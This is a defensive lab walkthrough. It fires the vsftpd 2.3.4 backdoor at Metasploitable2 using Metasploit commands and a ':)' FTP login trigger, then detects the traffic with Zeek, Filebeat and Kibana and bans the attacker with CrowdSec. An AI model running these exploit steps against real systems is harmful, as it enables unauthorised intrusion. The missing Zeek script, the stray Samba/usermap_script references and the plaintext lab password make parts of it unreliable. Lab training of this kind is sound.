# VSFTPD Exploit — Practical Workflow 

Objective: simulate the vsftpd 2.3.4 backdoor exploit against Metasploitable2, capture and detect the activity with Zeek, ship Zeek logs to Elasticsearch via Filebeat, and visualize in Kibana.

---

## Lab inventory

* Kali (attacker): `192.168.1.39`  — runs Metasploit / launches exploit
* Ubuntu (sensor): `192.168.1.35` — Zeek + Filebeat 
* Metasploitable2 (victim): `192.168.1.36` — vulnerable service (vsftpd)
* Elasticsearch/Kibana: `192.168.1.39:9200 / :5601` 



## 1) Zeek setup on sensor (Ubuntu)

### Install & verify Zeek (already installed in lab)

# Zeek binary location on this lab
/opt/zeek/bin/zeek --version
# add to PATH if needed
export PATH=$PATH:/opt/zeek/bin
```

### Configure interface

Edit `/opt/zeek/etc/node.cfg` and ensure:

```
[zeek]
type=standalone
host=localhost
interface=ens33
```

### Deploy Zeek

sudo zeekctl deploy
sudo zeekctl status
# logs directory
ls /opt/zeek/logs/current/
```

---

## 2) Ensure Zeek is deployed and running:

   sudo /opt/zeek/bin/zeekctl check
   sudo /opt/zeek/bin/zeekctl deploy
   ```
 Verify Zeek logs for Samba backdoor alerts:

   sudo tail -f /opt/zeek/logs/current/notice.log
   ```
Create `/opt/zeek/share/zeek/site/vsftpd-backdoor.zeek` with:


Zeek custom script (`vsftpd-backdoor.zeek`) detects `usermap_script` exploit and logs notice type `VSFTPD_Backdoor`.


Then redeploy:

sudo zeekctl deploy
```

Confirm `notice.log` exists:

ls /opt/zeek/logs/current/
tail -f /opt/zeek/logs/current/notice.log
```

---

## 3) Trigger exploit (Kali)

From Kali (attacker):

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.36
set LHOST 192.168.1.39   # your Kali IP for callback if needed
exploit
```

Or interactive test (simple trigger):

ftp 192.168.1.36
# when asked for user, enter:  :)
```

Verify on sensor:

tail -n 50 /opt/zeek/logs/current/notice.log
tail -n 50 /opt/zeek/logs/current/ftp.log   # if present
tcpdump -r /opt/zeek/logs/current/capture.pcap  # if you captured pcaps
```

---

## 4) Ship Zeek logs to Elasticsearch (Filebeat)

### Install Filebeat on sensor

# add Elastic repo and install (Ubuntu)
curl -fsSL https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/elastic.gpg
echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
sudo apt update
sudo apt install filebeat -y
```

### Enable Zeek module and configure paths

Edit `/etc/filebeat/modules.d/zeek.yml` and set:

- module: zeek
  connection:
    enabled: true
    var.paths: ["/opt/zeek/logs/current/conn.log*"]
  ftp:
    enabled: true
    var.paths: ["/opt/zeek/logs/current/ftp.log*"]
  notice:
    enabled: true
    var.paths: ["/opt/zeek/logs/current/notice.log*"]
```

### Configure Filebeat output to Elasticsearch (example `/etc/filebeat/filebeat.yml` snippet)

output.elasticsearch:
  hosts: ["https://192.168.1.39:9200"]
  username: "elastic"
  password: "elkpass1"
  ssl.verification_mode: none   # lab convenience — use CA in production

setup.kibana:
  host: "https://192.168.1.39:5601"
```

Make Zeek logs readable by Filebeat:

sudo chmod a+r /opt/zeek/logs/current/*.log
```

### Test config and load dashboards

sudo filebeat test config
sudo filebeat modules list   # confirm zeek enabled
sudo filebeat setup --dashboards --index-management
sudo systemctl enable --now filebeat
sudo journalctl -u filebeat -f
```

### Verify indices

curl -u elastic:elkpass1 -k https://192.168.1.39:9200/_cat/indices?v
# look for filebeat-zeek-* or filebeat-*
```

---

## 5) Kibana visualization & detection rules

1. In Kibana, create index pattern `filebeat-zeek-*` (or `filebeat-*`) if not auto-created. Use `@timestamp` as time field.
2. Dashboards: Filebeat `setup --dashboards` should add Zeek dashboards. Open `Dashboard` → search `zeek`.
3. Create a detection rule (Security → Rules):

   * Name: `Zeek vsftpd backdoor notice`
   * Index: `filebeat-zeek-*`
   * KQL: `zeek.notice.name : "VSFTPD_Backdoor" or zeek.ftp.user : ":)"`
   * Severity: High; map to ATT\&CK T1210/T1190
4. Save and enable. When the exploit runs, the rule generates an alert in Security → Alerts.

---

6) Containment using CrowdSec

# Ban the attacker IP (Kali)
sudo cscli decisions add --ip 192.168.1.39 --type ban --duration 1h --origin "SOC-manual-case-001"
sudo cscli decisions list -i 192.168.1.39

Verify ping is blocked:

ping 192.168.1.39
# IP is successfully blocked.




